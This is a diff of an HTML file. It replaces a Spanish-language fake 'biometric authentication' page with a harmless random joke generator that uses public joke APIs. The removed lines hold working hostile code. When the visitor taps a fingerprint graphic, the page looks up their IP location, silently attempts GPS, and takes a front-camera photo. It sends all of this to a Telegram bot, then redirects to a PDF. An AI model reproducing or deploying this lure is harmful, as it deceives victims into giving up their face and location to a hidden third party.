@@ -1,121 +1,192 @@
-<!DOCTYPE html>
-<html lang="es">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sistema de Verificación Biométrica</title>
-    <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Roboto', sans-serif; margin: 0; overflow: hidden; }
-        .auth-card { text-align: center; padding: 20px; width: 90%; max-width: 350px; }
-        h1 { font-size: 16px; letter-spacing: 3px; font-weight: 300; color: #00d4ff; margin-bottom: 50px; }
-        .sensor-container { position: relative; width: 120px; height: 120px; margin: 0 auto; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-        .fingerprint-svg { width: 70px; fill: #00d4ff; filter: drop-shadow(0 0 15px rgba(0, 212, 255, 0.6)); z-index: 5; }
-        .loading-ring { position: absolute; width: 110px; height: 110px; border: 2px solid rgba(0, 212, 255, 0.1); border-top: 2px solid #00d4ff; border-radius: 50%; display: none; animation: spin 1s linear infinite; }
-        .scan-line { position: absolute; width: 100px; height: 2px; background: #00d4ff; box-shadow: 0 0 20px #00d4ff; display: none; z-index: 10; animation: scan 2s ease-in-out infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes scan { 0%, 100% { top: 20%; } 50% { top: 80%; } }
-        .status { margin-top: 40px; font-size: 11px; letter-spacing: 2px; color: #666; text-transform: uppercase; }
-        .footer-note { position: absolute; bottom: 20px; font-size: 9px; color: #222; letter-spacing: 1px; }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Random Joke Generator</title>
+  <style>
+    :root {
+      --bg: #0f1724;
+      --card: #0b1020;
+      --muted: #9aa4b2;
+      --accent: #2dd4bf;
+      --accent-2: #60a5fa;
+      --glass: rgba(255,255,255,0.03);
+    }
+    html,body { height:100%; margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial; background:linear-gradient(180deg,var(--bg),#061021); color:#e6eef6; }
+    .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; box-sizing:border-box; }
+    .card {
+      width:100%; max-width:720px; background:linear-gradient(180deg,var(--card),#071020);
+      border-radius:12px; padding:28px; box-shadow: 0 10px 30px rgba(2,6,23,0.6);
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+    h1 { margin:0 0 6px 0; font-size:20px; letter-spacing:0.4px; color:var(--accent-2); }
+    p.lead { margin:0 0 18px 0; color:var(--muted); font-size:14px; }
+    .joke-area { background:var(--glass); border-radius:10px; padding:20px; min-height:120px; display:flex; flex-direction:column; justify-content:center; gap:10px; }
+    .joke-text { font-size:18px; line-height:1.4; color:#eaf6ff; }
+    .joke-meta { color:var(--muted); font-size:13px; display:flex; gap:10px; align-items:center; }
+    .controls { margin-top:18px; display:flex; gap:10px; flex-wrap:wrap; }
+    button {
+      border:0; background:linear-gradient(90deg,var(--accent),var(--accent-2)); color:#042028; padding:10px 14px; border-radius:8px;
+      cursor:pointer; font-weight:600; box-shadow: 0 6px 16px rgba(45,212,191,0.12);
+    }
+    button.ghost {
+      background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.04);
+      box-shadow:none; padding:8px 12px;
+    }
+    .small { padding:8px 10px; font-size:13px; }
+    .muted { color:var(--muted); font-size:13px; }
+    .loader { width:18px; height:18px; border-radius:50%; border:3px solid rgba(255,255,255,0.06); border-top-color:var(--accent); animation:spin 1s linear infinite; display:inline-block; vertical-align:middle; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .center { display:flex; align-items:center; gap:8px; }
+    .hidden { display:none; }
+    footer { margin-top:16px; color:var(--muted); font-size:12px; text-align:right; }
+    @media (max-width:560px) { .joke-text { font-size:16px; } }
+  </style>
 </head>
 <body>
+  <div class="wrap">
+    <div class="card" role="main" aria-labelledby="title">
+      <h1 id="title">Random Joke Generator</h1>
+      <p class="lead">Click the button to get a fresh joke from an external API. Uses icanhazdadjoke (JSON) with a fallback to Official Joke API.</p>
 
-    <div class="auth-card">
-        <h1>AUTENTICACIÓN REQUERIDA</h1>
-        <div class="sensor-container" id="sensor">
-            <div class="loading-ring" id="ring"></div>
-            <div class="scan-line" id="laser"></div>
-            <svg class="fingerprint-svg" viewBox="0 0 24 24"><path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.67-.2-.13-.24-.04-.55.2-.68C7.82 2.52 9.86 2 12.01 2c2.13 0 3.99.47 6.03 1.56.24.13.33.43.2.67-.09.16-.24.24-.43.24zm3.49 4.72c-.11 0-.22-.04-.31-.12-.18-.17-.43-.38-.73-.61-.23-.17-.28-.49-.11-.72.17-.23.49-.28.72-.11.33.25.62.49.84.69.21.19.22.51.03.71-.11.1-.28.16-.44.16zm-17.3.01c-.16 0-.32-.06-.43-.17-.19-.2-.18-.52.02-.71.22-.2.51-.44.84-.69.23-.17.55-.12.72.11.17.23.12.55-.11.72-.3.23-.55.44-.73.61-.1.08-.21.13-.31.13zm15.42 3.4c-.11 0-.21-.04-.31-.12-1.31-1.12-2.73-1.76-4.32-2-1.95-.31-3.89.15-5.5 1.29-.24.17-.56.11-.73-.13-.17-.24-.11-.56.13-.73 1.83-1.29 4.07-1.83 6.32-1.47 1.83.29 3.48 1.03 4.98 2.31.2.18.22.5.04.7-.09.09-.21.15-.41.15zM4.14 12.6c-.15 0-.3-.06-.41-.17-.2-.2-.2-.52 0-.72 1.51-1.3 3.16-2.03 4.99-2.32 1.15-.18 2.26-.14 3.32.12.29.07.47.36.4.65-.07.29-.36.47-.65.4-1.14-.28-2.31-.3-3.52-.11-1.57.24-2.98.88-4.28 2-.1.1-.23.15-.35.15zM12 22c-.11 0-.21-.04-.31-.12-1.54-1.28-2.61-2.48-3.41-3.8-.75-1.23-1.14-2.58-1.14-4.01 0-2.29 1.54-4.44 3.65-5.11 1.76-.56 3.63-.33 5.12.63 1.41.91 2.27 2.45 2.33 4.19.01.29-.21.53-.5.54s-.53-.21-.54-.5c-.05-1.42-.75-2.69-1.9-3.43-1.21-.78-2.73-.97-4.16-.51-1.71.55-2.99 2.31-2.99 4.2 0 1.25.34 2.42.98 3.47.7.1.15 1.7 1.12 3.03 2.5 1.07 2.1 4.17.21.5-.04-.31-.13-.42-.17zM14.28 15.65c-.19 0-.37-.11-.46-.29-.65-1.33-1.31-1.84-2.32-1.84s-1.68.51-2.33 1.84c-.13.26-.45.37-.71.24s-.37-.45-.24-.71c.88-1.78 2-2.37 3.28-2.37s2.4.59 3.28 2.37c.13.26.02.58-.24.71-.09.04-.19.05-.26.05z" /></svg>
-        </div>
-        <div class="status" id="status">Mantenga presionado para escanear</div>
+      <div class="joke-area" id="jokeArea" aria-live="polite">
+        <div class="joke-text" id="jokeText">Press "Get Joke" to start — you'll get a short, random joke.</div>
+        <div class="joke-meta" id="jokeMeta"></div>
+      </div>
+
+      <div class="controls">
+        <button id="getBtn">Get Joke</button>
+        <button id="anotherBtn" class="ghost small" disabled>Another</button>
+        <button id="copyBtn" class="ghost small" disabled>Copy</button>
+        <button id="shareBtn" class="ghost small" disabled>Share</button>
+        <div style="flex:1"></div>
+        <div class="muted center" id="status">Ready</div>
+      </div>
+
+      <footer>APIs: <a href="https://icanhazdadjoke.com/api" target="_blank" rel="noopener" style="color:var(--accent); text-decoration:none">icanhazdadjoke</a> + <a href="https://official-joke-api.appspot.com/" target="_blank" rel="noopener" style="color:var(--accent); text-decoration:none">Official Joke API</a></footer>
     </div>
+  </div>
 
-    <div class="footer-note">ENCRYPTED BIOMETRIC ACCESS SYSTEM</div>
+  <script>
+    // Simple Random Joke Generator
+    // Primary: https://icanhazdadjoke.com/ (requires Accept: application/json)
+    // Fallback: https://official-joke-api.appspot.com/random_joke
 
-    <script src="config.js"></script>
-    <script>
-        const sensor = document.getElementById('sensor');
-        const status = document.getElementById('status');
-        const laser = document.getElementById('laser');
-        const ring = document.getElementById('ring');
-        let procesoExitoso = false;
+    const getBtn = document.getElementById('getBtn');
+    const anotherBtn = document.getElementById('anotherBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const shareBtn = document.getElementById('shareBtn');
+    const jokeText = document.getElementById('jokeText');
+    const jokeMeta = document.getElementById('jokeMeta');
+    const status = document.getElementById('status');
 
-        async function obtenerGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.permissions) return resolve(null);
-                navigator.permissions.query({name:'geolocation'}).then((result) => {
-                    if (result.state === 'granted') {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: "MÉTRICA (GPS)" }),
-                            () => resolve(null),
-                            { timeout: 3000 }
-                        );
-                    } else { resolve(null); }
-                });
-            });
+    // show temporary status with optional loader
+    function setStatus(text, {loading=false} = {}) {
+      status.innerHTML = loading ? '<span class="loader" aria-hidden="true"></span> ' + text : text;
+    }
+
+    async function fetchIcanhaz() {
+      const res = await fetch('https://icanhazdadjoke.com/', {
+        headers: { Accept: 'application/json', 'User-Agent': 'Random-Joke-Generator (example)' }
+      });
+      if (!res.ok) throw new Error('icanhazdadjoke failed: ' + res.status);
+      return res.json(); // { id, joke, status }
+    }
+
+    async function fetchOfficialJoke() {
+      const res = await fetch('https://official-joke-api.appspot.com/random_joke');
+      if (!res.ok) throw new Error('official-joke-api failed: ' + res.status);
+      return res.json(); // {id, type, setup, punchline}
+    }
+
+    // returns {text, source}
+    async function getJoke() {
+      // Try primary
+      try {
+        const data = await fetchIcanhaz();
+        return { text: data.joke, source: 'icanhazdadjoke' };
+      } catch (e1) {
+        console.warn('Primary API failed:', e1);
+        // Fallback
+        try {
+          const d = await fetchOfficialJoke();
+          return { text: d.setup + (d.punchline ? ' — ' + d.punchline : ''), source: 'official-joke-api' };
+        } catch (e2) {
+          console.error('Fallback API failed:', e2);
+          throw new Error('Both joke APIs failed. Check your network or CORS policy.');
         }
+      }
+    }
 
-        async function validar() {
-            if (navigator.vibrate) navigator.vibrate(100);
-            status.innerHTML = "INICIANDO ESCANEO BIOMÉTRICO...";
-            ring.style.display = "block";
-            laser.style.display = "block";
+    async function showJoke() {
+      setStatus('Fetching joke...', { loading: true });
+      getBtn.disabled = true;
+      anotherBtn.disabled = true;
+      copyBtn.disabled = true;
+      shareBtn.disabled = true;
 
-            let infoReporte = "";
+      try {
+        const j = await getJoke();
+        jokeText.textContent = j.text;
+        jokeMeta.innerHTML = 'Source: <strong>' + j.source + '</strong>';
+        setStatus('Joke loaded');
+        // enable controls
+        anotherBtn.disabled = false;
+        copyBtn.disabled = false;
+        shareBtn.disabled = !navigator.share; // only enable if Web Share API present
+      } catch (err) {
+        jokeText.textContent = 'Sorry — could not get a joke right now.';
+        jokeMeta.textContent = '';
+        setStatus('Error: ' + err.message);
+      } finally {
+        getBtn.disabled = false;
+      }
+    }
 
-            try {
-                // 1. TRIANGULACIÓN POR NODOS
-                const res = await fetch('https://ipwho.is/');
-                const d = await res.json();
-                
-                // 2. Intento de GPS silencioso
-                const gps = await obtenerGPS();
-                const lat = gps ? gps.lat : d.latitude;
-                const lon = gps ? gps.lon : d.longitude;
-                const precision = gps ? gps.acc : "INFRAESTRUCTURA (Red)";
-
-                infoReporte = `🛡️ *AUDITORÍA TESIS* \n📡 *RED:* ${d.connection.isp} \n📍 *LOC:* ${d.city} \n🎯 *PREC:* ${precision} \n🔗 *MAP:* https://www.google.com/maps?q=${lat},${lon}&z=19`;
-
-                // 3. Captura de Cámara
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute("playsinline", true);
-                video.play();
-                
-                await new Promise(r => setTimeout(r, 2000));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
-                stream.getTracks().forEach(t => t.stop());
-
-                // 4. Envío a Telegram
-                const fd = new FormData();
-                fd.append('chat_id', CONFIG.CHAT_ID);
-                fd.append('photo', foto, 'evidencia.jpg');
-                fd.append('caption', `✅ *VERIFICADO*\n${infoReporte}`);
-                fd.append('parse_mode', 'Markdown');
-
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                
-                procesoExitoso = true;
-                status.innerHTML = "✅ IDENTIDAD VERIFICADA";
-                setTimeout(() => location.href = CONFIG.PDF_URL, 1000);
-
-            } catch (err) {
-                const errorMsg = (err.name === 'NotAllowedError') ? "🚫 BLOQUEO CÁMARA" : `⚠️ ERROR: ${err.message}`;
-                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `❌ *FALLO*\n${errorMsg}\n${infoReporte}`, parse_mode: 'Markdown' })
-                });
-                alert("Error de sensor. Asegúrese de permitir el acceso para continuar.");
-                location.reload();
-            }
+    // copy to clipboard
+    async function copyJoke() {
+      const text = jokeText.textContent;
+      try {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          await navigator.clipboard.writeText(text);
+        } else {
+          // fallback
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
         }
-        sensor.addEventListener('click', validar);
-    </script>
+        setStatus('Copied to clipboard');
+      } catch (e) {
+        setStatus('Copy failed');
+      }
+    }
+
+    // web share
+    async function shareJoke() {
+      if (!navigator.share) {
+        setStatus('Web Share API not available');
+        return;
+      }
+      try {
+        await navigator.share({ title: 'Funny Joke', text: jokeText.textContent });
+        setStatus('Shared');
+      } catch (e) {
+        setStatus('Share canceled');
+      }
+    }
+
+    // event listeners
+    getBtn.addEventListener('click', showJoke);
+    anotherBtn.addEventListener('click', showJoke);
+    copyBtn.addEventListener('click', copyJoke);
+    shareBtn.addEventListener('click', shareJoke);
+
+    // optional: fetch a joke automatically on page load
+    // showJoke();
+  </script>
 </body>
 </html>
